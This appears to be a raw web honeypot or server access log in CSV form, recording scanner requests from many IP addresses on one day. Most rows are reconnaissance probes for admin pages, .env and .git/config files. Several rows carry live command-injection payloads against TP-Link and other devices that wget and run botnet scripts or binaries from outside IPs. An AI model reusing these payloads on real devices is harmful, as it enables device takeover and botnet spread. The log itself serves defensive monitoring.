"2025-06-16","139.144.52.241","United States","HTTP","/default.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/info.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/main.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/api/version"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-bin/param.cgi?get_device_conf"
"2025-06-16","139.144.52.241","United States","HTTP","/base.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/portal/"
"2025-06-16","139.144.52.241","United States","HTTP","/lms/db"
"2025-06-16","139.144.52.241","United States","HTTP","/home.jsp"
"2025-06-16","139.144.52.241","United States","HTTP","/start.cgi"
"2025-06-16","139.144.52.241","United States","HTTP","/status"
"2025-06-16","139.144.52.241","United States","HTTP","/ext-js/app/common/zld_product_spec.js"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/default.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/info.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/login/login.html"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.cfm"
"2025-06-16","139.144.52.241","United States","HTTP","/cgi-bin/param.cgi?get_device_conf"
"2025-06-16","139.144.52.241","United States","HTTP","/indice.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/allversions"
"2025-06-16","139.144.52.241","United States","HTTP","/home.jsp"
"2025-06-16","139.144.52.241","United States","HTTP","/lms/db"
"2025-06-16","139.144.52.241","United States","HTTP","/versions"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.php"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.asp"
"2025-06-16","139.144.52.241","United States","HTTP","/ext-js/app/common/zld_product_spec.js"
"2025-06-16","139.144.52.241","United States","HTTP","/r-seenet/index.php"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jsp"
"2025-06-16","139.144.52.241","United States","HTTP","/admin.shtml"
"2025-06-16","139.144.52.241","United States","HTTP","/login/login.html"
"2025-06-16","139.144.52.241","United States","HTTP","/api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/indice.jsa"
"2025-06-16","139.144.52.241","United States","HTTP","/allversions"
"2025-06-16","139.144.52.241","United States","HTTP","/index.php"
"2025-06-16","139.144.52.241","United States","HTTP","/tos/index.php?user/login"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.php"
"2025-06-16","139.144.52.241","United States","HTTP","/versions"
"2025-06-16","139.144.52.241","United States","HTTP","/c/login"
"2025-06-16","139.144.52.241","United States","HTTP","/menu.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jsp"
"2025-06-16","139.144.52.241","United States","HTTP","/r-seenet/index.php"
"2025-06-16","139.144.52.241","United States","HTTP","/base.inc"
"2025-06-16","139.144.52.241","United States","HTTP","/WebApp/js/UI_String.js"
"2025-06-16","139.144.52.241","United States","HTTP","/base.jhtml"
"2025-06-16","139.144.52.241","United States","HTTP","/api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1"
"2025-06-16","139.144.52.241","United States","HTTP","/base.html"
"2025-06-16","139.144.52.241","United States","HTTP","/login.aspx"
"2025-06-16","139.144.52.241","United States","HTTP","/index.php"
"2025-06-16","139.144.52.241","United States","HTTP","/tos/index.php?user/login"
"2025-06-16","45.135.193.67","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","70.39.90.117","United States","HTTP","/.env"
"2025-06-16","70.39.90.117","United States","HTTP","/.git/config"
"2025-06-16","196.251.83.206","Seychelles","HTTP","/.env"
"2025-06-16","185.165.191.27","Seychelles","HTTP","/robots.txt"
"2025-06-16","185.165.191.27","Seychelles","HTTP","/sitemap.xml"
"2025-06-16","185.165.191.27","Seychelles","HTTP","/.well-known/security.txt"
"2025-06-16","185.165.191.27","Seychelles","HTTP","/favicon.ico"
"2025-06-16","109.199.96.156","Germany","HTTP","/boaform/admin/formLogin"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","68.183.117.102","United States","HTTP","/get.php"
"2025-06-16","196.251.115.46","The Netherlands","HTTP","/.env"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","144.172.103.59","United States","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F160.187.246.111%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk"
"2025-06-16","199.45.155.78","United States","HTTP","/favicon.ico"
"2025-06-16","199.45.155.78","United States","HTTP","/sitemap.xml"
"2025-06-16","87.255.194.135","Kazakhstan","HTTP","/admin/assets/css/jquery-ui.css"
"2025-06-16","170.39.218.2","Canada","HTTP","/.git/config"
"2025-06-16","89.42.231.140","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-06-16","45.156.87.115","The Netherlands","HTTP","/boaform/admin/formLogin"
"2025-06-16","45.135.194.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B)"
"2025-06-16","141.76.94.18","Germany","HTTP","http://141.76.94.18:80/pscan"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","207.167.67.206","United States","HTTP","http://example.com/"
"2025-06-16","87.121.84.34","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)"
"2025-06-16","87.121.84.34","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)"
"2025-06-16","118.194.248.4","South Korea","HTTP","/favicon.ico"
"2025-06-16","118.194.248.4","South Korea","HTTP","/robots.txt"
"2025-06-16","118.194.248.4","South Korea","HTTP","/sitemap.xml"
"2025-06-16","144.172.101.110","United States","HTTP","/boaform/admin/formLogin"
